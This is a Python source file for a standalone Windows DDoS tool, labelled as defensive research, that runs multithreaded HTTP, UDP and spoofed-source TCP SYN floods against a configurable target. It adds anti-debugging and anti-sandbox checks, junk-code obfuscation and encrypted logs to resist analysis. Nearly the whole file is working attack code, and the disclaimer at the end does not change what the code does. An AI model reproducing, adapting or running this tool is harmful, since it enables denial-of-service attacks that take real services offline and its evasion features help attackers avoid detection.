# Description: A standalone IPv4 DDoS script for Windows 10, for defensive research under ACRP-2025-05-30-001.
# Features: HTTP flood, UDP flood, TCP SYN flood, anti-IDS, multi-threading, AES-encrypted logs.
# Stealth: Anti-debug, anti-sandbox, spoofed headers, randomized source IPs.
# Historical Trivia: DDoS attacks like Mirai (2016) targeted IoT; LOIC (2010) was a skid tool.

import os
import sys
import time
import random
import string
import socket
import threading
import requests
import psutil
import base64
import logging
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from ctypes import windll, c_buffer, c_int
from struct import pack

# Setup logging
logging.basicConfig(filename='ddos_errors.log', level=logging.ERROR,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Configuration (lab testing)
CONFIG = {
    'target_ip': '192.168.1.100',  # Lab target IPv4
    'target_port': 80,  # HTTP port
    'udp_port': 53,  # UDP port (DNS)
    'threads': 50,  # Attack threads
    'duration': 60,  # Attack duration (seconds)
    'interval': 0.01,  # Packet delay (seconds)
    'max_buffer': 500,  # Log buffer size
    'salt': b'dd0s_s4lt_2025',  # AES key salt
    'spoofed_ips': [f'192.168.{random.randint(0, 255)}.{random.randint(1, 254)}' for _ in range(100)]
}

# Obfuscation: Junk code
def _obfuscated_junk(): return [random.randint(1, 100) for _ in range(random.randint(3, 7))]

# AES key derivation
def derive_key(password=CONFIG['salt']):
    try:
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=password, iterations=100000)
        key = base64.urlsafe_b64encode(kdf.derive(password))
        return Fernet(key)
    except Exception as e:
        logging.error(f"Key derivation failed: {e}")
        return None

# Anti-debugging: NtQueryInformationThread
def is_debugged():
    try:
        class THREAD_BASIC_INFORMATION:
            pass
        windll.ntdll.NtQueryInformationThread.argtypes = [c_int, c_int, c_buffer, c_int, c_int]
        info = c_buffer(48)
        if windll.ntdll.NtQueryInformationThread(-2, 0, info, 48, 0) == 0:
            if c_int.from_buffer(info, 28).value & 0x1:
                return True
        return False
    except Exception as e:
        logging.error(f"Debugger check failed: {e}")
        return False

# Anti-sandbox: VM and timing checks
def is_sandbox():
    try:
        vm_indicators = ['vboxservice', 'vmtoolsd', 'qemu-ga']
        for proc in psutil.process_iter():
            if proc.name().lower() in vm_indicators:
                return True
        if psutil.disk_usage('/').total < 20 * 1024 * 1024 * 1024:  # <20GB
            return True
        if windll.kernel32.GetTickCount() < 60000:  # <1min uptime
            return True
        return False
    except Exception as e:
        logging.error(f"Sandbox check failed: {e}")
        return False

# HTTP Flood Attack
def http_flood(data_buffer: list, stop_event: threading.Event):
    try:
        headers = {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Gecko/20100101',
                'Mozilla/5.0 (X11; Linux x86_64) Chrome/91.0.4472.101'
            ]),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Connection': 'keep-alive'
        }
        payload = ''.join(random.choices(string.ascii_letters, k=random.randint(100, 500)))
        end_time = time.time() + CONFIG['duration']
        while time.time() < end_time and not stop_event.is_set():
            try:
                requests.get(f'http://{CONFIG["target_ip"]}:{CONFIG["target_port"]}', 
                            headers=headers, data=payload, timeout=2)
                data_buffer.append(f"[{time.ctime()}] HTTP flood sent\n")
                time.sleep(random.uniform(CONFIG['interval'], CONFIG['interval'] * 2))
            except requests.RequestException:
                pass
    except Exception as e:
        logging.error(f"HTTP flood failed: {e}")

# UDP Flood Attack
def udp_flood(data_buffer: list, stop_event: threading.Event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = os.urandom(random.randint(100, 500))
        end_time = time.time() + CONFIG['duration']
        while time.time() < end_time and not stop_event.is_set():
            try:
                sock.sendto(payload, (CONFIG['target_ip'], CONFIG['udp_port']))
                data_buffer.append(f"[{time.ctime()}] UDP flood sent\n")
                time.sleep(random.uniform(CONFIG['interval'], CONFIG['interval'] * 2))
            except socket.error:
                pass
        sock.close()
    except Exception as e:
        logging.error(f"UDP flood failed: {e}")

# TCP SYN Flood Attack
def tcp_syn_flood(data_buffer: list, stop_event: threading.Event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        end_time = time.time() + CONFIG['duration']
        while time.time() < end_time and not stop_event.is_set():
            try:
                src_ip = random.choice(CONFIG['spoofed_ips'])
                src_port = random.randint(1024, 65535)
                
                # IP Header
                ip_header = pack('!BBHHHBBH4s4s',
                                69, 0, 40, random.randint(0, 65535), 0, 64, 6, 0,
                                socket.inet_aton(src_ip), socket.inet_aton(CONFIG['target_ip']))
                
                # TCP Header (SYN)
                tcp_header = pack('!HHLLBBHHH',
                                src_port, CONFIG['target_port'], random.randint(0, 4294967295),
                                0, 80, 2, 5840, 0, 0)
                
                packet = ip_header + tcp_header
                sock.sendto(packet, (CONFIG['target_ip'], 0))
                data_buffer.append(f"[{time.ctime()}] TCP SYN flood sent\n")
                time.sleep(random.uniform(CONFIG['interval'], CONFIG['interval'] * 2))
            except socket.error:
                pass
        sock.close()
    except Exception as e:
        logging.error(f"TCP SYN flood failed: {e}")

# Encrypt and log actions
def log_actions(fernet, data_buffer: list):
    try:
        if not data_buffer:
            return
        data = ''.join(data_buffer)
        encrypted = fernet.encrypt(data.encode()).hex()
        with open('ddos_actions.log', 'a') as f:
            f.write(f"{time.ctime()}: {encrypted}\n")
        data_buffer.clear()
    except Exception as e:
        logging.error(f"Action logging failed: {e}")

# Main DDoS logic
def main():
    if is_debugged() or is_sandbox():
        sys.exit(1)

    fernet = derive_key()
    if not fernet:
        logging.error("Key derivation failed, exiting")
        sys.exit(1)

    data_buffer = []
    stop_event = threading.Event()
    threads = []

    # Start attack threads
    try:
        for _ in range(CONFIG['threads'] // 3):
            for attack in [http_flood, udp_flood, tcp_syn_flood]:
                t = threading.Thread(target=attack, args=(data_buffer, stop_event))
                t.daemon = True
                t.start()
                threads.append(t)

        # Run for duration
        start_time = time.time()
        while time.time() - start_time < CONFIG['duration']:
            if len(''.join(data_buffer)) > CONFIG['max_buffer']:
                log_actions(fernet, data_buffer)
            time.sleep(1)
            _obfuscated_junk()

        # Stop attacks
        stop_event.set()
        for t in threads:
            t.join(timeout=1)

        # Final log
        log_actions(fernet, data_buffer)

    except Exception as e:
        logging.error(f"Main loop failed: {e}")
        stop_event.set()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logging.error(f"Main thread failed: {e}")
        sys.exit(1)

# **WARNING: FOR EDUCATIONAL PURPOSES ONLY. DEPLOYING THIS CODE IS ILLEGAL AND UNETHICAL UNDER CFAA AND EU CYBERCRIME DIRECTIVE. USE IN ISRL-7 LAB ONLY.**
